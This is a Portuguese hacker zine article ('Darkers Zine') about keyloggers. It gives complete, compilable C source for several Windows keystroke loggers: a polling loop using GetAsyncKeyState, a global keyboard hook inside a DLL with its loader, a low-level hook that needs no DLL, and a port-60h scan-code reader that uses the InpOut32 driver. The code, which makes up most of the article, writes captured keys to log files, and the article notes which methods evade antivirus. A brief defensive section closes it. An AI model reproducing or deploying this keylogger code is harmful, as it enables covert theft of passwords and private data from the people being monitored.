@@ -1,0 +1,493 @@
+############################################################################
+#                   Security Darkers                                       #
+#                     Darkers Zine                                         #
+#Membros:_Dr4k0_,Storm,gbr,nibbles,OnlyOne,Sthealt,Dark_Side,Fylhoth,rog   #
+#Autor: gbr                                                           #
+#Contato: wWw.darkers.com.br/smf                                           #
+#                                                                          #
+#                                                                          #
+############################################################################
+
+				   [ Resumo ]
+
+Neste artigo, vamos aprender um pouco mais sobre os keyloggers e algumas técnicas
+usadas por eles. Esse tipo de programa se tornou de uso comum e vem sendo usado
+como uma das mais formas mais eficientes de se obter dados sigilosos de
+organizações ou usuários domésticos.
+
+[ 1. Introdução ]
+
+Keylogger (lê-se: quilogger) é um dispositivo físico ou um pequeno programa
+de computador capaz de pegar as teclas pressionadas num computador e armazena-las.
+
+Keyloggers físicos podem ser instalados entre o teclado e o computador, pelo
+cabo, ou dentro do teclado. É frequentemente usado por empresas para monitorar
+seus empregados e em investigações e espionagem. Casos onde é possível ter acesso
+físico aos computadores. Já os keyloggers virtuais, são programas de computador,
+que precisam ser instalados no sistema operacional para o qual foram projetados.
+
+A partir daqui, quando falar em keylogger, estarei me referindo ao tipo virtual.
+
+Eles podem ser encontrados como programas com o único objetivo de monitorar o uso
+do teclado ou como uma funcionalidade de um programa que não tenha esse
+objetivo como o principal, como um software que trabalhe com informações
+sigilosas desenvolvido por um programador ladrão que quer roubar esses dados e
+vendê-los.
+
+Infelizmente, é grande a quantidade de computadores infectados, dos quais
+informações são enviadas aos ladrões diariamente. Grande parte dos computadores
+que têm conexão à internet estão vulneráveis a esse tipo de infecção, por alguns
+dos seguintes motivos:
+
+   . Usam sistemas operacionais antigos, desatualizados ou muito vulneráveis a ataques.
+   . Não têm sistemas anti-vírus, anti-keylogger e firewall, que ajudam a reduzir
+     bastante as chances de infecção.
+   . Têm os sistemas de segurança citados acima, mas não estão atualizados e capazes
+     de detectar novas ameaças.
+   . É possível desenvolver programas maliciosos indetectáveis, ou no mínimo, capazes
+     de burlar alguns dos principais sistemas de detecção.
+   . Muitos usuários não têm conhecimentos mínimos de práticas seguras ao usar um
+     computador, e acabam facilitando a entrada de programas maliciosos.
+
+Na seção 2, veremos como é o funcionamento básico de um keylogger.
+
+[ 2. Funcionamento ]
+
+O princípio básico de funcionamento de um keylogger, é pegar cada tecla pressionada
+pelo usuário, e gravá-la no arquivo de log. Os métodos disponíveis para um keylogger
+executar esses passos são limitados, mas não significa que uma proteção efetiva seja
+algo tão trivial.
+
+Isso porque as rotinas e passos executados pelo keylogger são também executadas por
+aplicações normais que precisam de alguma forma, monitorar o uso do teclado,
+dificultando o trabalho dos programas anti-keyloggers.
+
+A maioria dos keyloggers comerciais possuem diversas funcionalidades além de apenas
+gravar as teclas pressionadas. Elas vão desde a configuração de inicialização
+automática, execução em modo oculto, geração de logs em formatos melhor visualizáveis
+(HTML), com informações diversas sobre o sistema no momento que tal tecla foi
+pressionada, como por exemplo o título da janela em foco e qual a aplicação que
+recebeu os dados, até o envio dos logs pela internet usando geralmente os protocolos
+SMTP, FTP ou HTTP, num intervalo de tempo programável, para serem analisados
+posteriormente.
+
+Alguns podem gerar arquivos de log criptografados, dificultando a detecção por uma
+análise forense e permitindo a visualização somente com a chave secreta da
+criptografia. Podem também capturar telas em intervalos periódicos.
+
+Nas próximas seções, veremos como pode ser escrito um keylogger para sistemas
+Windows, usando diferentes métodos, cada um com vantagens e desvantagens em relação
+aos programas anti-keyloggers. Não irei abordar funcionalidades adicionais, como
+inicialização automática, envio de logs por SMTP e técnicas anti-detecção, dentre
+outros. O objetivo é entender como as informações sobre o uso do teclado podem ser
+obtidas.
+
+[ 3. Keyloggers para Windows]
+
+A facilidade de se programar um keylogger para Windows explica o alto número de
+keyloggers em circulação. Alguns mais sofisticados, outros menos.
+
+Para acompanhar os exemplos dados aqui, é recomendável o conhecimento de alguma
+linguagem de programação e manipulação de arquivos.
+
+Os exemplos para cada método foram escritos na linguagem C. O compilador usado foi
+o BloodShed Dev-C++ 4.9.9.2.
+
+Todos eles usam a função GetKeyNameText() para simplificar o processo de conversão
+dos códigos das teclas para seus respectivos caracteres.
+
+[ 3.1 Usando GetAsyncKeyState/GetKeyState ]
+
+O Windows nos fornece a API Win32, uma interface de programação de aplicativos que traz
+muitas facilidades para o programador. Programas podem usar funções dessa API desde que
+sejam linkados dinâmicamente às bibliotecas de ligação dinâmica (DLLs).
+
+As funções GetAsyncKeyState/GetKeyState, localizadas na DLL user32.dll, quando chamadas
+podem detectar se uma tecla cujo código virtual é passado como argumento, está
+pressionada ou não naquele instante. Sabendo disso, podemos escrever um programa que
+execute um laço infinitamente, e dentro dele chamar uma dessas funções, passando como
+parâmetro cada um dos códigos de tecla virtual de um intervalo definido.
+
+Se, para um dado código, o valor de retorno da função representar que a tecla está
+pressionada, pega-se o código virtual passado e converte-o para seu correspondente
+ASCII, para poder gravá-lo no arquivo de log.
+
+Para compilar um exemplo desse tipo de keylogger, você pode criar um novo projeto do
+tipo Windows Application no Dev-C++, e editar o arquivo main.c com o seguinte código:
+
+------------------------------------------------------ main.c -------------------------------------------------------
+
+/* kl1 by gbr - Funciona em Windows 9x/ME/NT/2000/XP/2003 */
+#include <stdio.h> /* fopen(), fputs(), fclose() */
+#include <windows.h> /* GetAsyncKeyState(), GetKeyNameText(), MapVirtualKey() */
+
+int main() {
+    short virtualkey;
+    char keyinfo[256]; /* String para armazenar o nome da tecla pressionada */
+    FILE *logfile; /* Ponteiro para o arquivo de log */
+
+    while(1) {
+        sleep(10); /* Evita 100% de uso da CPU */
+        for(virtualkey=8;virtualkey<=255;virtualkey++) { /* Intervalo de códigos virtuais relativos a teclado */
+            if(GetAsyncKeyState(virtualkey)==-32767) { /* Verifica se a tecla cujo código virtual foi passado está pressionada  */
+                logfile = fopen("c:\\log1.txt","a+"); /* Abre arquivo para adcionar nome da tecla */
+                GetKeyNameText(MapVirtualKey(virtualkey,0) << 16, keyinfo, sizeof(keyinfo)); /* Pega nome da tecla pressionada */
+                fputs(keyinfo, logfile); /* Grava nome da tecla no arquivo */
+                fclose(logfile); /* Fecha arquivo */
+                break; /* Sai do laço for e espera próxima tecla */
+            }
+        }
+    }
+
+    return 0;
+}
+
+--------------------------------------------------------- fim ---------------------------------------------------------
+
+Este método é o mais fácil para escrever um keylogger, que também será facilmente
+detectado por um anti-keylogger. Eles monitoram cada programa carregado na memória e
+impedem que obtenham informações do teclado por esse tipo de função.
+
+Já os antivírus têm dificuldade pra detectar esse tipo de keylogger, pelo fato de não
+poder acusar um arquivo como sendo keylogger ou não apenas verificando se esse faz
+chamadas à GetAsyncKeyState/GetKeyState.
+
+[ 3.2 Usando Windows Hook ]
+
+Um hook é uma função que pode monitorar o que acontece por dentro do sistema operacional.
+Pode ser instalado no sistema e capturar mensagens do Windows antes que sejam tratadas
+por ele. Existem diferentes tipos de hook: WH_MOUSE, WH_KEYBOARD, WH_CBT. Podem ser
+classificados em hooks globais, que monitora todo o sistema, e hooks locais, que monitoram
+um programa (thread) específico [2].
+
+O Windows mantém uma lista chamada hook chain que contém ponteiros para cada procedimento
+hook instalado no sistema.
+
+As funções da API Win32 mais importantes para trabalhar com hooks são: SetWindowsHookEx
+(instala um procedimento hook), CallNextHookEx (chama o próximo procedimento hook no ) e
+UnhookWindowsHookEx (desinstala um procedimento hook).
+
+Keyloggers baseados nesse modelo, instalam hooks globais e dos tipos WH_KEYBOARD ou
+WH_KEYBOARD_LL. Isso porque precisam capturar as teclas pressionadas em todos os programas.
+
+Quando um hook é global, costuma-se usar uma DLL contendo a função hook para poder ser
+acessada por todos os programas (seção 3.2.1). Mas consegue-se também instalar um hook
+global sem usar DLLs, desde que seja do tipo WH_KEYBOARD_LL (Low Level) (seção 3.2.2).
+
+[ 3.2.1 Hook com dll ]
+
+A idéia geral na criação de um keylogger baseado em hook é a instalação de um hook capaz de
+monitorar as teclas pressionadas. Este poderia ser do tipo WH_KEYBOARD ou WH_KEYBOARD_LL.
+O keylogger instala-o no sistema, indicando a função callback a ser chamada dentro da DLL e
+fica ativo na memória esperando ser encerrado.
+
+A partir daí, cada vez que o Windows for tratar os eventos do teclado, primeiro ele chamará
+essa função callback dentro da DLL e depois o controle é passado para o sistema. Dentro dela
+é possível obter as informações necessárias, como qual tecla foi pressionada e gravá-la no
+arquivo de log.
+
+Agora podemos ver um exemplo. Primeiro é preciso criar a DLL. No Dev-C++, crie um Projeto de
+DLL e edite os arquivos que aparecerem da seguinte forma:
+
+-------------------------------------------------------- dll.h --------------------------------------------------------
+
+#ifndef _DLL_H_
+#define _DLL_H_
+
+#if BUILDING_DLL
+# define DLLIMPORT __declspec (dllexport)
+#else /* Not BUILDING_DLL */
+# define DLLIMPORT __declspec (dllimport)
+#endif /* Not BUILDING_DLL */
+
+LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam); /* Protótipo da Callback */
+
+#endif /* _DLL_H_ */
+
+--------------------------------------------------------- fim ---------------------------------------------------------
+
+------------------------------------------------------ dllmain.c ------------------------------------------------------
+
+#include <stdio.h> /* fopen(), fputs(), fclose() */
+#include <windows.h> /* SetWindowsHookEx(), UnhookWindowsHookEx(), CallNextHookEx(), GetKeyNameText(), MapVirtualKey() */
+#include "dll.h" /* Cabeçalho de construção da DLL */
+
+/* Esse valolr precisa ser o mesmo para cada instância da DLL na memória, assim, vamos compartilhá-lo */
+#pragma data_seg(".SHAREDDATA")
+static HHOOK hook=NULL; /* Conterá a identificação do hook instalado */
+#pragma data_seg()
+#pragma comment(linker, "/section:.SHAREDDATA,RWS")
+
+FILE *logfile; /* Ponteiro para o arquivo de log */
+char keyinfo[256]; /* String para armazenar o nome da tecla pressionada */
+
+/* Função exportada para instalação do hook */
+DLLIMPORT void installhook(HINSTANCE hInst) {
+    if(!hook)
+        hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInst, 0); /* Instala um hook global do tipo WH_KEYBOARD */
+}
+
+/* Função que será chamada cada vez que ocorrer um evento do teclado */
+LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
+    if(((DWORD)lParam & 0x40000000) &&(code==HC_ACTION)) { /* Verifica se uma tecla está pressionada */
+            logfile=fopen("c:\\log2.txt","a+"); /* Abre arquivo */
+            GetKeyNameText(MapVirtualKey(wParam,0) << 16, keyinfo, sizeof(keyinfo)); /* Pega o nome da tecla pressionada */
+            fputs(keyinfo, logfile); /* Grava o nome no arquivo de log */
+            fclose(logfile); /* Fecha o arquivo de log */
+    }
+
+    return CallNextHookEx(hook, code, wParam, lParam); /* Passa as informações para o próximo procedimento hook no hook chain */
+}
+
+BOOL APIENTRY DllMain (HINSTANCE hInst     /* Library instance handle. */ ,
+                       DWORD reason        /* Reason this function is being called. */ ,
+                       LPVOID reserved     /* Not used. */ )
+{
+    switch (reason)
+    {
+      case DLL_PROCESS_DETACH:
+          UnhookWindowsHookEx(hook); /* Desinstala o hook quando a DLL for descarregada da memória */
+      default:
+          break;
+    }
+
+    return TRUE;
+}
+
+-------------------------------------------------------- fim --------------------------------------------------------
+
+Compile o projeto e um arquivo .dll será criado.
+
+Agora criaremos o keylogger. Crie um Projeto Windows Application e edite o arquivo
+como o seguinte:
+
+------------------------------------------------------ main.c ------------------------------------------------------
+
+/* kl2 by gbr - Funciona em Windows 9x/ME/NT/2000/XP/2003 */
+#include <windows.h> /* LoadLibrary(), GetProcAddress(), GetMessage() */
+
+/* Prótotipo para a função installhook da DLL */
+typedef void (*InstFuncPtr)(HINSTANCE hInst);
+
+/* Variáveis que irão conter os ponteiros para as funções */
+InstFuncPtr install = NULL;
+
+int main() {
+     HINSTANCE hMod; /* Variável que conterá a instância do módulo carregado (DLL) */
+     MSG msg; /* Estrutura que conterá informações de mensagens do sistema */
+
+     hMod = LoadLibrary("exemplo2dll.dll"); /* Carrega a DLL */
+     if(!hMod)
+         return -1; /* Se não encontrá-la, finaliza o keylogger */
+
+     install = (InstFuncPtr)GetProcAddress(hMod, "installhook"); /* Faz install apontar para o endereço da função installhook */
+     if(!install)
+         return -1; /* Se não encontrar a função installhook dentro da DLL, finaliza o keylogger */
+
+     install(hMod); /* Chama função que irá instalar o hook */
+
+     while(GetMessage(&msg,0,0,0));  /* Este loop de mensagens mantém o keylogger ativo na memória */
+
+}
+
+-------------------------------------------------------- fim -------------------------------------------------------
+
+Compile o projeto e será criado um executável, o keylogger.
+
+Basta colocar os dois arquivos que foram gerados (EXE e DLL), num mesmo diretório e rodar
+o keylogger.
+
+Esse método de keylogger, usando Windows Hook requer um pouco mais de código, mas é bastante
+usado por keyloggers comercias. É facilmente bloqueado por um anti-keylogger, que monitore o
+hook chain a procura de programas que tentem hookar o teclado.
+
+Keyloggers que usam-no, frequentemente têm uma DLL associada ao EXE, que será separada logo
+após infecção, residindo no mesmo diretório do keylogger ou num diretório de DLLs do Windows.
+
+Bons antivírus costumam detectar esses keyloggers usando heurística.
+
+[ 3.2.2 Hook sem dll ]
+
+Você pode instalar um hook global de teclado de baixo nível sem usar uma DLL. Basta escrever
+a função callback no próprio keylogger e passar a instância do executável para a função
+SetWindowsHookEx().
+
+Esse método contraria as especificações do MSDN quanto a criação de hooks globais, que segundo
+a documentação, precisam ter a função callback implantada numa DLL.
+
+Veremos agora um exemplo usando esse modelo. Crie um novo Projeto Windows Aplication no Dev-C++
+e edite o arquivo main.c com o conteúdo abaixo.
+
+------------------------------------------------------ main.c ------------------------------------------------------
+
+/* kl3 by gbr - Funciona em Windows 2000/XP/2003 */
+#include <stdio.h> /* fopen(), fputs(), fclose() */
+#include <windows.h> /* SetWindowsHookEx(), UnhookWindowsHookEx(), CallNextHookEx(), GetKeyNameText(), MapVirtualKey(), GetMessage() */
+
+/* Esse valor precisa ser o mesmo para cada instância da DLL na memória, assim, vamos compartilhá-lo */
+#pragma data_seg(".SHAREDDATA")
+static HHOOK hook=NULL; /* Conterá a identificação do hook instalado */
+#pragma data_seg()
+#pragma comment(linker, "/section:.SHAREDDATA,RWS")
+
+FILE *logfile; /* Ponteiro para o arquivo de log */
+char keyinfo[256]; /* String para guardar o nome da tecla pressionada */
+__declspec(dllexport) LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam); /* Protótipo da Callback */
+
+/* Função que instala o hook */
+void installhook() {
+     if(!hook)
+         hook = SetWindowsHookEx( WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
+}
+
+/* Função Callback exportada */
+__declspec(dllexport) LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
+     if((code == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN))) { /* Verifica se uma tecla está pressionada */
+          KBDLLHOOKSTRUCT *pkbhs = (KBDLLHOOKSTRUCT *) lParam; /* Estrutura para extrair as informações de lParam */
+          logfile=fopen("c:\\log3.txt","a+"); /* Abre arquivo de log */
+          GetKeyNameText(MapVirtualKey(pkbhs->vkCode,0) << 16, keyinfo, sizeof(keyinfo)); /* Pega o nome da tecla pressionada */
+          fputs(keyinfo, logfile); /* Grava o nome no arquivo de log */
+          fclose(logfile); /* Fecha o arquivo de log */
+     }
+
+     return CallNextHookEx(hook, code, wParam, lParam); /* Passa as informações para o próximo procedimento hook no hook chain */
+}
+
+/* Este loop de mensagens mantém o keylogger continue ativo na memória */
+void MsgLoop()
+{
+    MSG msg;
+    while (GetMessage(&msg,NULL,0,0));
+}
+
+int main() {
+     installhook(); /* Instala o hook */
+     MsgLoop(); /* Chama o loop */
+}
+
+-------------------------------------------------------- fim -------------------------------------------------------
+
+[ 3.3 Usando acesso direto ao hardware por um driver ]
+
+O sistema operacional Windows, a partir das Versões 9x não permite que um programa
+rodando em modo usuário tenha acesso às portas lógicas do hardware.
+
+Existem certas portas que permitem acesso microcontrolador 8042 do teclado e mouse.
+Essas portas vão de 60h-64h e nas versões atuais do Windows só estão acessíveis
+através de algum driver, instalado com privilégios de administrador.
+
+Aqueles que quiserem usar essas portas, podem criar seus drivers, que é um trabalho
+não muito simples, ou utilizar algum já pronto.
+
+Por questões de simplicidade, vamos usar a InpOut32Drv Driver Interface DLL, que é
+um driver na forma de DLL que é instalado no sistema automaticamente e pode ser obtida
+no site do desenvolvedor [3].
+
+Para saber como podemos obter informações das teclas pressionadas usando esse método,
+veremos brevemente como funciona o microcontrolador 8042.
+
+Esse controlador é o circuito que controla o teclado. Quando recebe um scan code
+do controlador integrado ao teclado, lendo a porta de E/S 60h, ele sinaliza a
+interrupção de hardware dedicada ao teclado (IRQ 1). Então, o processador interpreta
+a tecla [4].
+
+O que o código faz é desabilitar a interrupção (IRQ 1) do teclado, ler os scan codes
+na porta 60h e reativá-la.
+
+O exemplo abaixo é apenas uma demonstração de como esse método pode ser usado num
+keylogger. Por questões de instabilidade, salve todos os seus dados para assegurar
+que nenhum dado será perdido se for preciso reiniciar o sistema.
+
+Para ver a demonstração, Você pode criar um novo arquivo com o Dev-C++ e adcionar
+o seguinte código:
+
+------------------------------------------------------ main.c ------------------------------------------------------
+
+/* ex4 by gbr */
+#include <stdio.h> /* printf() */
+#include <windows.h> /* GetProcAddress(), LoadLibrary(), GetKeyNameText(), FreeLibrary() */
+#include <string.h> /* strcmp() */
+
+/* Protótipos para as funções da DLL Inp32() e Out32() */
+typedef short (_stdcall *inpfuncPtr)(short portaddr);
+typedef void (_stdcall *outfuncPtr)(short portaddr, short datum);
+
+int main() {
+    HINSTANCE hLib; /* Variável para guardar a instância da DLL carregada */
+    inpfuncPtr Inp32; /* Ponteiro para função Inp32() */
+    outfuncPtr Out32; /* Ponteiro para função Out32() */
+    short scancode, CommandByte; /* Dados que serão lidos e/ou escritos nas portas de E/S do controlador */
+    char keyinfo[256]; /* String para guardar o nome da tecla pressionada */
+    int cont; /* Um contador */
+
+    /* Carrega a DLL. Se não encontrá-la no diretório do programa, ou no diretório de DLLs do sistema, termina o programa */
+    hLib = LoadLibrary("inpout32.dll");
+    if(!hLib)
+        return -1;
+
+    /* Pega o endereço das funções dentro da DLL. Se não achar, termina o programa */
+    Inp32 = (inpfuncPtr)GetProcAddress(hLib, "Inp32");
+    if(!Inp32)
+        return -1;
+    Out32 = (outfuncPtr)GetProcAddress(hLib, "Out32");
+    if(!Out32)
+        return -1;
+
+    /* Desativa a interrupção do teclado */
+    Out32(0x64,0x20);
+    CommandByte = Inp32(0x60);
+    Out32(0x64,0x60);
+    Out32(0x60,CommandByte & 0xFE);
+
+    /* Laço onde lêmos o scan code e mostramos o nome da tecla */
+    for(cont=0;cont<1000;cont++) {
+        while((Inp32(0x64) & 1)==0); /* Espera até que haja dados no registrador de saída */
+        scancode = Inp32(0x60); /* Lê o scan code da tecla pressionada */
+
+        GetKeyNameText(scancode << 16, keyinfo, 256); /* Obtém o nome da tecla */
+        if(strcmp("",keyinfo)!=0)
+            printf("%s",keyinfo); /* Mostra o nome da tecla */
+     }
+
+     /* Reativa a interrupção do teclado */
+     Out32(0x64,0x60);
+     Out32(0x60,CommandByte);
+
+     FreeLibrary(hLib); /* Libera a DLL */
+
+	 return 0;
+}
+
+-------------------------------------------------------- fim -------------------------------------------------------
+
+Compile o programa e se quiser rodar, lembre-se de ter copiado a DLL Inpout32 para o diretório.
+
+Keyloggers baseados nesse modelo são de difícil detecção, por trabalharem num nível baixo, próximo
+ao kernel.
+
+[ 4. Recomendações de segurança ]
+
+Como foi visto acima, os anti-keyloggers oferecem uma proteção adicional ao usuário, bloqueando
+grande parte dos keyloggers existentes, que não são baseados no kernel.
+
+Os antivírus em geral, não apresentam bons métodos de detecção de keyloggers, pois baseiam suas
+buscas na análise de binários usando heurística, sem monitorar o sistema como um todo. Eles
+funcionam melhor na detecção de keyloggers já reconhecidos enquanto os anti-keyloggers bloqueiam
+tanto os keyloggers conhecidos quanto possíveis suspeitos.
+
+A melhor forma de se proteger do uso ilegal dos keyloggers é ter uma noção básica das técnicas que
+eles podem usar em seus códigos, e também o uso de bons sistemas de detecção.
+
+[ 5. Links e Referências ]
+
+[1] Keystroke logging - Wikipédia
+http://en.wikipedia.org/wiki/Keystroke_logging
+
+[2] About Hooks - MSDN
+http://msdn.microsoft.com/library/default.asp?url=/library/en-us/winui/winui/windowsuserinterface/windowing/hooks/abouthooks.asp
+
+[3] InpOut32 and InpOutx64
+http://www.highrez.co.uk/Downloads/InpOut32/default.htm
+
+[4] The PS/2 Keyboard Interface
+http://www.computer-engineering.org/ps2keyboard/
